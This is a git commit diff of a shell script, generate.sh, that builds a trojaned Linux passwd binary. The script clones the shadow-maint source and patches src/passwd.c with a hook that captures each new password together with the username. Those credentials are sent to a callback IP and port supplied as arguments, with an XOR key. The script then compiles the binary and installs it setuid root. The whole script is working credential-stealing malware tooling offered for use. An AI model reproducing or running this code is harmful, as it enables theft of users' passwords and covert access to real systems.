b01198ea2e617eaf2b7eeec7bf68b6eaf0efda32
P4ral1ax <braydenjw00@gmail.com>
2022-12-15 16:15:14 -0500

    integrated patch file

--- generate.sh
+++ generate.sh
@@ -3,18 +3,21 @@
 ## Check if Root ##
 if [ "$EUID" -ne 0 ]; then 
   echo "Must run as superuser"
+  echo "Usage : ./generate {Callback IP} {Port} {Interface} {XOR Key}"
   exit
 fi
 
-## Get Variables ##
-echo -n "Enter the IP Address to Callback to : "
-read ip
-echo -n "Set the destination port : "
-read port
-echo -n "Enter XOR Key : "
-read key
-echo -n "Enter Interface name : "
-read interface
+## Check if Correct Number of Variables ##
+if [ $# -ne 4 ]; then
+  echo "Illegal number of parameters"
+  echo "Usage : ./generate {Callback IP} {Port} {Interface} {XOR Key}"
+fi
+
+## Assign Variables ##
+ip=$1
+port=$2
+interface=$3
+key=$4
 echo -ne " IP : ${ip}\n Port : ${port}\n Interface : ${interface}\n XOR Key : ${key}\nConfirm these settings [y/n] : "
 read pass
 if [[ $pass == n ]]; then
@@ -22,54 +25,22 @@ if [[ $pass == n ]]; then
 fi
 
 ## Get dependancies and autogen ##
-sudo apt install -y git make 
-sudo apt install -y autoconf autopoint libtool xsltproc libselinux1-dev libsemanage1-dev bison byacc python3-pip
+sudo apt install -y git make autoconf autopoint libtool xsltproc bison byacc python3-pip
 sudo pip3 install python-dotenv
-sudo apt-get build-dep -y shadow
-touch .env
+
 git clone https://github.com/shadow-maint/shadow
 cd shadow
 ./autogen.sh --without-selinux
+cd ../
 
 ## Add Inject Code ##
-
-cd ../
-# Assign Code to Paste
-imports=$(head -n 7 hook_code.txt)
-def_var="#define IP \"${ip}\""
-def_port="#define PORT ${port}"
-code=$(tail -n +13 hook_code.txt)
-
-# Fix Newline Char
-imports=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$imports")
-def_var=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$def_var")
-def_port=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$def_port")
-code=$(sed ':a;N;$!ba;s/\n/\\n/g' <<< "$code")
-
-## Modify Code ##
-cd shadow
-# Inject Hook
-sed -i "/salt = crypt_make_salt (NULL, NULL);/i \        writetofile(pass);" src/passwd.c
-
-# Add Imports
-sed -i '/#include \"shadowio.h\"/a '"$imports"'' src/passwd.c
-
-# Add Variables
-sed -i '/#include <string.h>/a '"$def_var"'\n'"$def_port"'' src/passwd.c
-
-# Add Hook Function
-sed -i '/static int new_password (const struct passwd \*pw)/i '"$code"'' src/passwd.c
-sed -i 's/\", name, xor_password);/ /g' src/passwd.c
-sed -i 's/fprintf(fptr, \"%s:%s/fprintf(fptr, \"%s:%s\\n\", name, password);/g' src/passwd.c
-
-# add snprint
-sed -i 's/\/\/SNPRINT/int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", name, password, ip);/g' src/passwd.c
-
-# Add Interface (Idk why but only works at the end)
-sed -i 's/INT_HERE/'"\"$interface\""'/g' src/passwd.c
-sed -i 's/KEY_HERE/'"$key"'/g' src/passwd.c
+sed -i 's/%ip%/'"$ip"'/g' passwd.patch
+sed -i 's/%port%/'"$port"'/g' passwd.patch
+sed -i 's/%int%/'"$interface"'/g' passwd.patch 
+sed -i 's/%key%/'"$key"'/g' passwd.patch 
+patch shadow/src/passwd.c passwd.patch 
 
 ## Make ##
-sudo make all
-sudo chmod 4755 src/passwd 
-cp src/passwd ../
+sudo make all 
+cp shadow/src/passwd ../
+chmod 4755 passwd 
